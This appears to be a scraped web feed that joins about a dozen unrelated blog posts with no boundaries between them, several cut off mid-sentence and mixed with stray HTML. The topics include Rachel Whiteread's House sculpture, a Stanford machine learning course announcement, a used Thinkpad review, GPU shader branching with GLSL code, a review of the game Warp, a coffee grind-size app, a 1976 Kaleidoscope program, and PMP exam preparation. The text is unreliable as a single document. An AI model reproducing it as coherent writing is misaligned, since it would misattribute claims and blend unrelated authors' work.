<p>The bulldozers came on January 11th 1994. The <em>East London Advertiser</em> reports that ‘art lovers’ chained themselves to the railings in attempt to save the work, quoting one as protesting, ‘We’re doing this because House represents the destruction of not only homes but whole communities in East London.’ Another suggested its removal was a sacrilegious act, perceiving House as ‘a headstone to the houses that were here.’ But the sculpture’s fate was sealed. As Whiteread succinctly mused ‘it took three and a half years to develop, four months to make, and thirty minutes to demolish.’</p>



<h2>The legacy of Rachel Whiteread’s House</h2>



<p>The Houseless Park has now had over 20 years to bed in to the community’s psyche and flourish naturally. In all of the articles and art history books I have trawled to substantiate …</p></div></div>

    <p>Ever since teaching <a href="https://github.com/chiphuyen/stanford-tensorflow-tutorials">TensorFlow for Deep Learning Research</a>, I’ve known that I love teaching and want to do it again.</p>

<p>In early 2019, I started talking with Stanford’s CS department about the possibility of coming back to teach. After almost two years in development, the course has finally taken shape. I’m excited to let you know that I’ll be teaching <strong>CS 329S: Machine Learning Systems Design at Stanford</strong> in January 2021.</p>

<p>The course wouldn’t have been possible with the help of many people including <a href="https://cs.stanford.edu/~chrismre/">Christopher Ré</a>, Jerry Cain, Mehran Sahami, <a href="https://pirroh.fyi/">Michele Catasta</a>, Mykel J. Kochenderfer.</p>

<p>Here’s a short description of the course. You can find the (tentative) syllabus below.</p>

<p><em>This project-based course covers the iterative process for designing, developing, and deploying machine learning systems. It focuses on systems that require massive datasets and compute resources, such as large neural networks. Students will learn about the different layers of the data pipeline, approaches to model selection, training, scaling, as well as how to deploy, monitor, and maintain ML systems. In the process, students will learn about important issues including privacy, fairness, and security.</em></p>

<p><strong>Pre-requisites</strong>: <em>At least one of the following; CS229, CS230, CS231N, CS224N, or equivalent. Students should have a good understanding of machine learning algorithms and should be familiar with at least one framework such as TensorFlow, PyTorch, JAX.</em></p>

<p>For Stanford students interested in taking the course, <a href="https://bit.ly/appy-mlsys-2021">you can fill in the application here</a>. The course will be evaluated based on one final project (at least 50%), three short assignments, and class participation.</p>

<p>For those outside Stanford, I’ll try to make as much of the course materials available as possible. I’ll post updates about the course on <a href="https://twitter.com/chipro">Twitter</a> or you can check back here from time to time.</p>

<p>Since these are all new materials, I’m hoping to get early feedback. If you’re interested in becoming a reviewer for the course materials, please shoot me an email. Thank you!</p>

<div><p>Want to start an online service-based business or start an agency?</p><p>Here are 117 examples of services you can sell online, in 6 different categories. </p></div>



<h2>Why we made this list:</h2>



<div><p><strong>1. To inspire you.</strong></p><p>Lots of entrepreneurs mention that one of their biggest obstacle to starting a company is finding what to work on. This list gives you not only ideas, but also examples of real successful businesses built on those ideas.</p><p><strong>2. To show you can build a successful business around one service.</strong></p><p>You don’t need to do more (or offer more) to be successful when running a service business. Pick one service (e.g. <em>Website-as-a-service</em>), one niche (e.g. <em>Lawyers</em>) and get started (e.g. <em>Done-for-you websites for lawyers</em>).</p></div>







<div><p>E-commerce is a huge industry that is <a href="https://www.statista.com/statistics/379046/worldwide-retail-e-commerce-sales/">projected to grow to 6.54 trillion</a> (yes, trillion) US dollars by 2022.</p><p>Can you grab a slice of this by helping e-commerce sellers with one of their tasks?</p><p>Take marketplaces for example: Etsy,&nbsp; Amazon, Red Bubble, PoshMark, Teespring) or any e-commerce platforms (Shopify or Woocommerce are two examples that come to mind), you can probably build a service just for one marketplace or platform and be successful with that.</p><p><strong>Examples of e-commerce services:</strong></p><p>1.

<p>2020-10-23</p>
<p>For my current job I knew I wanted a Linux laptop again, after enough exposure to Apples ecosystem. Naturally a Thinkpad came to mind as an option, but I wanted to give used hardware a chance, given that Thinkpads are known to be reliable and well built.</p>
<p>I went with used/refurbished hardware from a vendor I know and trust for a while now, <a href="https://www.lapstore.de/">lapstore.de</a>, and I could not be happier with my choice. I went with a Lenovo Thinkpad T460s, as a compromise between decent performance, weight, screen size and good Linux support out of the box. This model is 5 years old, but CPUs are not evolving that fast anymore, so it still feels very snappy with everything I'm doing. The internal screen could have used a slightly higher resolution for my taste, but I am rarely using it these days.</p>
<p>One big advantage of the older models is access to the old version of the docking stations, which are totally worth it. At home the laptop sits there, gets charged and drives my 4K display easily, while being hooked up to my mouse, keyboard and network cable. Speaking of ports: the T460s still has proper Rj-45, USB 2.0/3.0 and HDMI ports. No adapters needed!</p>
<p>Summing up, here is why I think used hardware is worth considering:</p>
<ul>
<li>it is cheaper. Sure, your employer might be paying for it, but maybe you have a fixed budget and get more out of it this way.</li>
<li>it is good for the environment.</li>
<li>it will likely last for the next few years. Most of us don't need the latest hardware to do our job. I would argue that quite a bit of software could run better if developers weren't handed the latest and greatest hardware as a given</li>
<li>you are not giving up support. Sure, it might break. But so does a new one. There are quite a few respectable dealers out there who offer 3 years of warranty for little extra cost. Actually the first (used) docking station I got was not working ok, so I got an immediate, brand new replacement 2 days later.</li>
<li>Linux runs great on older hardware. With Kubuntu 20.04 everything works out of the box, including webcam, multimedia keys, docking/undocking or switching between different screen configurations.</li>
</ul>
<p>Why not give used hardware a try?</p>
<p>EDIT [2020-10-27] fixed typo "wantec"</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
 <div>
  
  <p><label>Posted on <strong>26 October 2020</strong></label></p><p>An <a href="https://www.google.com/search?q=three+weeks&amp;oq=three+weeks">eternity</a> ago, I published a <a href="https://www.peterstefek.me/focused-render.html">blog post</a> about a shader I wrote. In that post, I casually repeated a piece of gpu folklore I picked up as a wee opengl enthusiast almost a decade ago,   </p>
<p>
"Using if statements inside a shader will cause performance degradation."  
</p>

<p>People on the internet seemed a little skeptical about this statement, and I realized my advice might be outdated. So this post is a quick follow up about the cost of branching on more modern gpus.  </p>
<p>Before we talk about branching, what is a gpu? A GPU or graphics processing unit, is a special piece of hardware initially developed to crunch numbers for graphics calculations. It accomplishes this goal quickly through a large amount of parallelization.   </p>
<p>GPUs can run many threads at the same time in parallel. These threads are generally executed in groups called warps (CUDA), invocations (Vulkan) and waves (I will use the term warp, but they are all interchangeable). On recent Nvidia hardware (Ampere/ Volta / Pascal) these warps contain 32 threads. Pascal for example can theoretically run up to four independent instructions per warp over 56 warps of 32 threads which comes out to a mind blowing 7168 instructions per cycle. </p>
<p>Each warp can only execute one instruction at a time. However that instruction can be executed for each of the threads in the warp. This means the GPU can execute 32 copies of the same instruction in parallel for each thread in the warp at once.   </p>
<p>However, taking both sides of a branch will cause the threads inside a warp to "diverge". This means some threads will need to execute one side of the branch and some will need to execute the other. Unfortunately, both instructions can not be executed simultaneously for threads in the same warp. So these divergent instructions must be executed sequentially.   </p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/pascal-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.  </p>
<p>Consider the <a href="https://www.shadertoy.com/view/WdyyWV">following fragment shader</a>:<br>
<code>
void mainImage( out vec4 fragColor, in vec2 fragCoord )
{  <br>
  </code></p><p><code>
  // TUNE THIS AMOUNT TO YOUR GPU STRENGTH<br>
  int workAmount = 2000;<br>
  float incr = 1. / float(workAmount);<br>
  float outColor = 0.0;  
<p>// USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  bool branch = true;  </p>
<p>if (mod(fragCoord.x, 2.) &lt; 1. &amp;&amp; branch) {
    </p><div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(0.0,outColor,0.0,1.0);
      </p></div>
  } else {
    <div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(outColor,0.0,0.0,1.0);
      </p></div>
  }
  </code></p><p><code>
}
</code></p>
<p>In fragment shaders like the one above, each warp is composed of a set of spatially close pixels. Each warp in this shader should diverge because each horizontally adjacent pixel takes a different side of the branch. Let's say the cost of each inner loop is n cycles. Since each side of the branch is executed in series, each warp must take at least 2n cycles, even though each thread uses only one side of the branch. These effects scale with the number of threads in the distinct divergent paths taken (up to 32x in Nvidia hardware). Here's another shader which should have roughly four branches per warp. <a href="https://www.shadertoy.com/view/wsVyzG">This shader</a> will take at least 4n cycles.  </p>
<p>However, let's look a <a href="https://www.shadertoy.com/view/tsVyzG">second shader</a>:   </p>
<p><code>
void mainImage( out vec4 fragColor, in vec2 fragCoord )
{
  </code></p><p><code>
  // USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  int workAmount = 2000;<br>
  float incr = 1. / float(workAmount);<br>
  float outColor = 0.0;  
<p>// USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  bool branch = true;  </p>
<p>if (fragCoord.x &lt; iResolution.x / 2.0 &amp;&amp; branch) {
    </p><div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(0.0,outColor,0.0,1.0);
    </p></div>
  } else {
    <div><p>
        for (int i = 0; i &lt; workAmount; i++) {
          </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(outColor,0.0,0.0,1.0);
      </p></div>
  }
  </code></p><p><code>
}
</code></p>
<p>This shader should run roughly twice as fast as the other shader even though roughly the same number of pixels take each branch. This is because most of the warps do not diverge (with the exception of a few around half way across the screen).   </p>
<p><strong>Nvidia Specifics</strong><br>
As far as I can tell, there are roughly two different ways of nvidia graphics cards handle divergence with in a warp.</p>
<p><strong>Thread Masking (Pre Volta)</strong><br>
On pre volta Nvidia card, divergence was handled by something called thread masking.   </p>
<p>Basically when a conditional is hit, a thread mask is generated.  We can think of this mask as a 32 entry array. Each entry specifies whether the corresponding thread takes the first side of the branch or not. The first side is then executed for each of those threads. After the first side of the branch is then executed, the mask is reversed and the other side of the branch is executed.   </p>
<p>This thread mask strategy exists in part because there is only one program counter per warp on pre volta gpus. So essential every thread in the warp must be at the same place in the program. The only way we know which threads to execute, is by using the mask.</p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/pascal-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.</p>
<p>It's worth noting that only the threads which need to execute the branch actually are assigned to computational cores. So if no threads execute one side of the branch, no work is done.</p>
<p><strong>Independent Thread Scheduling (Volta and Beyond)</strong><br>
One big change in the Volta architecture and beyond is the introduction of "Independent Thread Scheduling".   </p>
<p>In Independent thread scheduling, each thread has its own program counter. This allows each warp to track the execution of every thread at a fine grain level. However, we can still only execute only one instruction at a time. So the actual runtime of a branch does not change.  </p>
<p>So if Independent Thread Scheduling does not speed up branching, what does it do? Independent Thread Scheduling enables both sides of a branch to execute concurrently but not in parallel.   </p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/volta-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.</p>
<p>The reason for this shift is because before Volta, branches were places where deceptive deadlocks could occur. <br>
<code>
leader_id = 0<br>
If (threadIdx.x == leader_id) {<br>
  </code></p><p><code>
    // Do some inital work
  </code></p><p><code>
} else {
  <p>
    // Wait for leader to finish it's work<br>
    // then do my work
  </p>
}<br>
</code></p>
<p>In the above compute shader pseudo code, we have 31 "follower" threads waiting for the "leader thread" to finish (using in-warp shared local memory) before executing their own instructions. </p>
<p>On a Pascal GPU or below, if the else side of the branch is executed first, a deadlock will occur. The leader will never get a chance to start it's work because its followers will be waiting for it. </p>
<p>Independent Thread Scheduling gets around these locking problems by interlacing the two diverging paths. </p>
<p><strong>Article TLDR</strong><br>
Branch divergence in warp makes all parts of the branch execute in sequence which slows down the shader. Branching divergence between warps does not affect runtime.  </p>
<p><strong>Further Reading</strong><br>
Branch execution on gpus is surprisingly deep, and there are many edge cases I didn't address and I also didn't touch gpu vendors other than Nvidia. Here are some good sources if you want to learn more:  </p>

              <p>Warp is a puzzle–based stealth action game where you play as Zero, a little orange alien with a big score to settle!</p>
<p>I copied that off the game's website.</p>
<p>The important part is in the first five words. Warp is puzzle-based. That's how the game is billed, that's what I expected.</p>
<p><img src="http://www.mandible.net/wp-content/uploads/2013/01/8-1-5.jpg" alt="" title="WARNING, WARNING, A CUTE ORANGE THING IS LOOSE. RUN AROUND POINTLESSLY AND DO NOT LOOK UP. WARNING." width="650" height="382" srcset="http://www.mandible.net/wp-content/uploads/2013/01/8-1-5-300x176.jpg 300w, http://www.mandible.net/wp-content/uploads/2013/01/8-1-5.jpg 650w" sizes="(max-width: 650px) 100vw, 650px"></p>
<p>And let's get this out of the way: Warp is a good game. The puzzles are fun, the game is pretty, the plot is predictable but in the good we're-all-familiar-with-this-myth-so-let's-get-the-cliches-out-of-the-way-and-have-some-puzzle-fun manner. I like myths. Myths are good. Myths attached to a puzzle game are even better.</p>
<p>Zero, the playable character, has a host of special abilities. He can warp through solid walls and obstructions, he can warp inside objects and explode them from the inside, he can swap places with objects and he can launch objects at high speed. Note that "objects" includes "people". In most puzzle games, "people" are major puzzle pieces. In Warp, the only real difference between a turret and a person is that the person is easier to lure into important locations and doesn't shoot you as quickly.</p>
<p>It's all a recipe for a great puzzle game, and it's honestly somewhat tragic that it falls short.</p>
<p>The thing about good puzzle games is that, by their very nature, you'll have trouble with them. Some puzzle games are designed so that it's impossible to get stuck. Some are designed so that restarting is easy and fast. Warp is a bit of a curious beast in that it's also a stealth action game. Your opponents have guns, they are quick with their triggers, and you will die in a single shot. So: You die. You hit the "restart" button.</p>
<p><img src="http://www.mandible.net/wp-content/uploads/2013/01/W_Screenshot2.jpg" alt="" title="DANGER! LOADING SCREEN APPROACHES" width="650" height="365" srcset="http://www.mandible.net/wp-content/uploads/2013/01/W_Screenshot2-300x168.jpg 300w, http://www.mandible.net/wp-content/uploads/2013/01/W_Screenshot2.jpg 650w" sizes="(max-width: 650px) 100vw, 650px"></p>
<p>You sit there staring at a loading screen for ten seconds.</p>
<p>Which doesn't sound like a lot, but Warp is a <i>very</i> deadly game. The wrong approach can, and will, lead to death in seconds. Even when you're not being actively shot at, the world is littered with lasers and explosives and similar instant death traps. The second level starts with a puzzle that will kill you so quickly that failure results in spending more time loading than playing. And even when your plan is perfect and the area is harmless, Warp's sensitive controls will lead to you waltzing into lasers and warping yourself straight into death far more often than you'd expect.</p>
<p>Each time, accompanied by a ten second loading screen.</p>
<p>It is hard to describe how annoying that is, and it's just a herald of what lies in store.</p>
<p>Warp is filled with minor issues. Nothing that, in itself, would cripple the game. Things that I'd normally be remarking about in passing, as a minor blemish on an otherwise good game. But they just came so quickly and so relentlessly that it seemed every time I forgot about one, I'd run into another.</p>
<p>Example: The levels are filled, not just with armed guards, but with unarmed scientists. The scientists are terrified of you. Perpetually. Doesn't matter if you've carefully avoid killing scientists. Every time you warp into a room: screaming scientists. You can stand in the room for a minute and they just keep running around panicking, you leave the room, they recover and go back to work, teleport back in and it's Screamtown USA all over again.</p>
<p><img src="http://www.mandible.net/wp-content/uploads/2013/01/warp2-620x.jpg" alt="" title="AUGH. AUUUUUGH. AUUGH. AUUUGH. AUUUUUUUUUGH. DON'T LOOK AT MY PANTS. AUUUUUUUUUUUUGH." width="620" height="349"></p>
<p>This could have been improved in several ways. Iji does it brilliantly – avoiding slaughter in Iji eventually leads to the "enemies" allying with you, followed by an entire different branch of the game with a different ending. Extra endings and game branches take time and money, of course. Here's an easier idea: <i>make the damn scientists quieter</i>. As it is, every time you jump into a room you're greeted with an atmosphere-obliterating chorus of screeches. Or make them stop paying attention to you after a while! Maybe that's a reward for not killing them: they stop setting off alarms!</p>
<p>Another example: I mentioned Warp's controls. Most of my frustration revolved around Zero's Illusion ability, which allow him to project a duplicate of himself to trick enemies. The problem is that any damage done to the illusion, or any missteps into areas where the illusion is not allowed to go, will dissipate the illusion . . . causing Zero to instantly start moving in whatever direction the illusion was moving. If you use the illusion in a place where it's not allowed – even if a valid spawn point is literal inches away – the illusion will spawn directly in front of Zero, instantly disperse, and return control to Zero when you're least expecting it.</p>
<p>So if, for example, you decide to create an illusion and move it forward, and at that very instant a laser beam fires directly ahead of you, your illusion will walk into it, disperse, and before you have time to react, Zero will troop happily into it and die.</p>
<p>Cue ten-second load screen.</p>
<p>Not that this happened to me dozens of times over during the end boss fight or anything.</p>
<p><img src="http://www.mandible.net/wp-content/uploads/2013/01/Warp-Screenshot-3.jpg" alt="" title="SIR, WE HAVE HIM IN OUR SIGHTS, AND IT DEFINITELY ISN'T AN ILLUSION THIS TIME, UNLIKE THE PREVIOUS TWENTY SEVEN TIMES" width="620" height="349"></p>
<p>I can live with issues like this if the game is a low-budget affair, and doubly so if they're easy to recover from. Hotline Miami, an even faster-paced game released lately, is buggy as hell and had many fascinating problems and glitches as I fought my way through the levels. But in Hotline Miami, restarting the level is instant. And Hotline Miami's art is relatively simple, and its budget, I suspect, was quite minimal. For an indie game, Warp is a high-budget game, built on the Unreal engine, with detailed 3d models, good texturing, copious voice acting and cutscenes, and a boss that randomly and mysteriously fails to take damage from being attacked. Given the money spent on the rest of the game, the controls, loading times, and gameplay bugs are just unacceptable.</p>
<p>In the end, I kept feeling like the actual <i>game</i> had taken second tier to the rest of Warp. Compared to the amount of polish the art and atmosphere received, the gameplay was rough and spiky.</p>
<p>Warp is a good game. But with a little more work on the interface and a little more work on the game behavior, it could have been a lot better . . . even if that meant sacrificing a bunch of polygons.</p>

<h2 id="intended-audience">Intended audience</h2>

<p>GitHub Pages uses <a href="https://jekyllrb.com/">Jekyll</a>, a publishing system based on the Ruby programming language. The Jekyll documentation is excellent, especially if you already know Jekyll, program in Ruby, and have both Ruby and Jekyll installed on your local computer. The GitHub Pages documentation is comprehensive and excellent–if you’re already a Jekyll expert.</p>

<p><a href="https://tomcam.github.io/least-github-pages/">The Least You Need to Know About GitHub Pages</a> is designed for people who don’t happen to know Jekyll already but who need to get up to speed in GitHub Pages quickly to get a job done <em>now</em>. It tells you not only <em>what</em> to do step by step,
but also briefly explains <em>why</em> you’re doing it.</p>

<p>You probably don’t want to use GitHub Pages on sites that require complex, individual formatting on a per-page basis. 
GitHub Pages uses Markdown, which has some limited formatting information but not a lot.
GitHub Pages then uses Jekyll to turn that Markdown into HTML, based on the Jekyll theme you’ve chosen. Generally speaking this approach is
absolutely ideal for blogs, technical documents and instructional materials that require versioning and collaboration, where the
main work product is words and pictures. It is not a good fit for things like boutique pages, restaurant menu sites, consumer product sites, and so on where
custom formatting is the norm.</p>

<p>[Edit April 25 2019: Please note <strong>this is not an iPhone or Android app</strong>, and I have no plans to release it as such. You can use your phone or any other camera to take pictures of your ground coffee, but then you need to install the application on either OS X or through Python (on any operating system) to analyze the data. <a href="https://github.com/jgagneastro/coffeegrindsize/archive/master.zip">Download the application package here</a>.]</p>



<p>Today I would like to present an OS X application I have been developing for a few months. It turns out writing Python software for coffee is a great way to relax after a day of writing Python software for astrophysics.</p>



<p>When I started being interested in brewing specialty coffee a few years ago, one of the first things that irritated me was our inability to recommend grind sizes for different coffee brewing methods, or to compare the quality of different grinders in an objective way. Sure, some laboratories have laser diffraction equipment that can measure the size of all particles coming out of a grinder, but rare are the coffee geeks that have access to these multi-hundred thousands of dollars kinds of equipment.</p>



<p>At first, I decided to take pictures of my coffee grounds spread on a white sheet, and to use an old piece of software called <a href="https://imagej.nih.gov/ij/">ImageJ</a>, developed by the National Institutes of Health mainly to analyze microscope images, to obtain a distribution of the sizes of my coffee grounds. This worked decently well, and allowed me to start comparing different grinders. Then <a href="https://www.scottrao.com/">Scott Rao</a> made me realize that a stand-alone application that doesn’t need a complicated installation and that is dedicated to coffee would be of interest to many people in the coffee industry. Probably just the 10% geekiest of them, but that’s cool.</p>



<p>I’m hoping that this application will help us understand the effects of particle size distributions on the taste of coffee. I don’t think the industry really kept us in the loop with all the laser diffraction experiments, so hopefully we can help ourselves as a community.</p>



<p>If you are interested in measuring the particle size distribution of your grinder, then this app is for you ‒ and it’s free. I placed it as “open source” on <a href="https://github.com/jgagneastro/coffeegrindsize">GitHub</a>, so if you are a developer, you are welcome to send me suggestions in the form of <em>push requests</em> (the developers will know what that means).</p>



<p>If you would like to get started, I suggest you read this quick <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_installation.pdf">installation guide</a>, which will explain how to download the app and run it even though I am not a registered Apple Developer. Then, you can choose to either read this <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_summarized_manual.pdf">quick summary</a> that will get you running with the basics, or this <strong><em>very</em></strong> detailed and wordy <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_manual.pdf">user manual</a> that will guide you through all the detailed options the application offers you.</p>



<p>I would like to show you an example of what can be done with the software. Below, I am comparing the particle size distribution of the Baratza Forté grinder, which uses 54 mm flat steel burrs, with that of the Lido 3 hand grinder, which uses 48 mm conical steel burrs. I set both grinders in a way that produces a similar peak of average-sized particles with diameters around 1 mm, but as you can see, the particle size distributions are very different ! The Forté generates way less fines (with diameters below 0.5 mm) and slightly less boulders (with diameters of approximately 2 mm), which is indicative of a better quality grinder.</p>



<figure><img data-attachment-id="976" data-permalink="https://coffeeadastra.com/lido3_size9_file10_hist_mass_diam/" data-orig-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png" data-orig-size="1000,780" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lido3_size9_file10_hist_mass_diam" data-image-description="" data-medium-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png?w=300" data-large-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png?w=750" src="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png" alt=""><figcaption>An example of figure that can be generated with the coffee grind size software. Each red bar corresponds to one kind of particle diameter generated by the Lido 3 grinder (smallest particles correspond to the leftmost bar, largest ones correspond to the rightmost bar), and their heights correspond to the total contribution of these kinds of particles, by mass. As you can see, the particles that contribute to the largest amount of mass have sizes just above 1 mm. The red circle shows the average particle diameter for the Lido 3, and the horizontal bars show the “characteristic width” of the distribution – this corresponds to the width that covers approximately 68% of all the distribution. Similarly, the blue line and the blue circle describe the distribution of the Forté grinder.</figcaption></figure>



<p>For now, the app is only intended to be used on OS X computers. But if you are running any other kind of system and know your way around Python, you can always download it directly from <a href="https://github.com/jgagneastro/coffeegrindsize">GitHub</a> and run it with your own installation of Python 3.</p>



<figure><video controls="" src="https://www.dropbox.com/s/66ug5i9bkhrghef/screencap_coffeegrindsize.mov?raw=1"></video><figcaption>This is an example of how to use the coffee grind size application.</figcaption></figure>



<p>I would like to thank Scott Rao for his excitement when I shared this project idea with him, and for beta testing the software. I would also like to thank Alex Levitt, Mitch Hale, Caleb Fischer, Francisco Quijano and Victor Malherbe for beta testing the software.</p>

  <div>
    <p>I recently came across a <a href="https://www.quaxio.com/files/2020/kaleidoscope/kscope.txt">piece of assembly</a> code, written by Li-Chen Wang, which
displays a Kaleidoscope. This code was written in 1976, and distributed for $15
on a <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/Kaleidoscope_for_Cromemco_Dazzler.jpg/1920px-Kaleidoscope_for_Cromemco_Dazzler.jpg">punched tape</a>. It appears this was one of three pieces of code used to
demonstrate the capabilities of <a href="https://en.wikipedia.org/wiki/Cromemco_Dazzler">Cromemco's Dazzler</a>, the first commercial
color graphics card for microcomputers.</p>

<blockquote>Stan Veit, owner of the Computer Mart of New York, described the reaction
  when he displayed the changing patterns of Kaleidoscope on a color television
  in his store window at the corner of 5th Avenue and 32nd Street in New York
  City in early 1976. “People driving by began to stop and look – they had never
  seen anything like it before. In a short time the Dazzler had caused a traffic
  jam on 5th Avenue!” The police had to contact the building landlord and make
  him disconnect the television.</blockquote>

<p><a href="https://en.wikipedia.org/wiki/Li-Chen_Wang">Dr. Li-Chen Wang</a> made quite some important
contributions resulting in the growth of the computer industry, such as a free
and open source BASIC interpreter as well as pioneering the concept of free software.</p>

<p>It turns out running this code from the dawn of computers in a browser isn't
too hard. The code is 127 bytes long. I found an existing <a href="https://github.com/maly/8080js">8080 emulator</a>. With the help of this <a href="https://www.quaxio.com/files/2020/kaleidoscope/cromemco_dazzler_manual.pdf">technical manual</a>, I wrote
the <a href="https://www.quaxio.com/files/2020/kaleidoscope/kaleidoscope.js">bare minimum amount of code</a> to emulate a Dazzler. Computer manuals back then were very detailed, especially for hardware that came as a kit, requiring a day or two of soldering.</p>

<p>Below is the result of running the code. In a subsequent post, I will cover how the code actually works.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Aside from software development, I also enjoy studying other related fields like marketing, project management, and product management.</p><p>Any reasonably sized software needs planning to be executed properly and after you "finish it" (a software product is never actually "done"), you need to market it to the public in order to make sales.</p><p>In this article, I will describe the process I took to become a Project Management Professional (PMP) by the Project Management Institute (PMI), one of the most sought certifications, not only in project management but in the market as a whole.</p><p>I was able to start my studies and take the test successfully in 2 months, studying between 3 and 4 hours a day, every day, weekends included, and get the results below:</p><p>Overall performance:</p><p><img src="https://renanmf.com/wp-content/uploads/2020/10/pmp-overall-performance.png" alt="Initial"></p><p>Performance by domain:</p><p><img src="https://renanmf.com/wp-content/uploads/2020/10/pmp-exam-breakdown.png" alt="Initial"></p><h2>What is the PMI and the PMP?</h2><p>The PMI (Project management institute) is the main organization when you think about project management.</p><p>Project Management varies a lot from place to place, from project to project, and from industry to industry, but there are some standards across all of those that are considered general best practices.</p><p>The PMI publishes the PMBoK (Project Management Body of Knowledge), which is a guide of best practices in project management.</p><p>The PMBoK is <strong>not</strong> a methodology, the project team needs to decide which processes will be applied according to their needs.</p><p>The PMBoK is usually updated every 4 or 5 years with new practices and a review of the current ones.</p><h2>PMP Certification requirements</h2><p>To apply for the test, you have to meet some criteria as described by the official PMI page:</p><ul><li>A four-year degree</li><li>36 months leading projects</li><li>35 hours of project management education/training or CAPM® Certification</li></ul><p><strong>OR</strong></p><ul><li>A high school diploma or an associate’s degree (or global equivalent)</li><li>60 months leading projects</li><li>35 hours of project management education/training or CAPM® Certification</li></ul><p>You can find everything you need to know about the application and the certification process itself on the official page of the exam at <a href="https://www.pmi.org/certifications/project-management-pmp">Project Management Professional (PMP)®</a>.</p><h2>What do you need to prepare</h2><p>I had 3 things at hand to prepare:</p><ul><li><a href="https://www.pmi.org/pmbok-guide-standards/foundational/pmbok">The PMBoK</a></li><li><a href="https://www.amazon.com/PMP-Exam-Prep-Eighth-Updated/dp/1932735658">Rita Mulcahy’s PMP Exam Prep</a></li><li>An exam simulator</li></ul><h3>The PMBoK</h3><p>This is PMI’s official resource to study. In a sense, it contains everything you need regarding topics.</p><p>The problem is that the PMBoK alone is a little too dry to study for the exam and it doesn’t have exercises to practice.</p><p>This is simply because the PMBoK is a reference book, not a study guide.</p><p>The best way to get a copy is to register as a PMI Associate. As an associate, you get a free copy of the PMBoK and you also get a good discount on the exam fee.</p><h3>Rita Mulcahy’s PMP Exam Prep</h3><p>This is the book you want to have with you as your best friend.</p><p>Unlike the PMBoK, Rita’s book is a written course to help you organize ideas and absorb the topics of the exam with questions at the end of each chapter.</p><p>This one is a must, although kind of expensive, but not so much if you compare it with a live or online course that might cost you thousands of dollars instead of a few hundred like the book.</p><p>And the book has a huge advantage compared to a course: you can resell the book to somebody else and recover most of the investment you made or you can even buy a used copy from someone and save a buck.</p><h3>Exam simulator</h3><p>I did the exam back in 2018 and the simulator I used is no longer available, so I won’t recommend any specific simulator because I only recommend things I have used and can guarantee they actually work.</p><p>You can search for a "PMP exam simulator" on the internet and find lots of them.</p><p>Look for reviews to find a good one, these might be pricey, but they are worth it if you want to pass the exam.</p><p>A good simulator should allow you to practice questions by specific areas, so you can focus on one at a time when studying.</p><p>And, of course, they must have a good enough amount of questions so you can practice at least 2 complete exams, similar to the one you are actually going to take on the test day.</p><h2>How to study</h2><p>You might not be able to take the exam in 2 months and that’s ok! Actually, most people take between 3 and 6 months of study before taking the exam.</p><p>I will describe the process I used to study, each person has a rhythm and different constraints in life, so adapt this to a schedule you can actually keep.</p><p>1 – Read Rita’s book in parallel with the PMBoK, then answer the questions at the end of each chapter of Rita’s book.<br> 2 – Once a week, at least, answer questions on the exam simulator by area. Do not attempt to mix questions of many areas at first, let each one sink in.<br> 3 – Review the areas in which you are not scoring well in the simulator. You don’t need a perfect score and a good simulator will tell you where you should focus to get better.<br> 4 – Repeat steps 1,2, and 3 until you finish all the chapters in Rita’s book.<br> 5 – As soon as you feel comfortable, try as many complete exams simulator as you can, I would say something between 2 and 4 are enough.</p><p>I did 2 complete exams, on two different days, a week before the test.</p><p>You mustn’t let anyone distract you, lock yourself in a room and simulate the environment of the test so you get a feel of how to behave on the test day and how to manage your time appropriately.</p><h2>The exam day</h2><p>If you followed all steps described before and had good scores on the simulator, don’t worry, you are good to go!</p><p>Just one last tip: don’t get stuck on a question.</p><p>The exam is 4 hours long and has 200 questions, this means you have, on average 1.2 minutes per question!</p><p>Some questions will feel easier, some will feel harder, that’s normal, no one has all the answers, if you feel stuck on one question mark it for later and review it at the end if you have some time left.</p><p>Prepare well, keep calm, and good luck!</p></div></div>]]>

<p>Online discourse has recently been borrowing vocabulary from Lewis Carroll. From articles about the dangers 
of 
rabbit holes on social media, Youtube and Reddit, to QAnon's "follow the white rabbit" mantra, concepts from 
Alice's Wonderland seem to fit naturally with the internet.</p>
<p>In Lewis Carroll's book, Alice and the white rabbit are the only two characters that transition from reality 
to 
Wonderland. The white rabbit is driven by anxiety. Alice by curiosity. We are motivated to access 
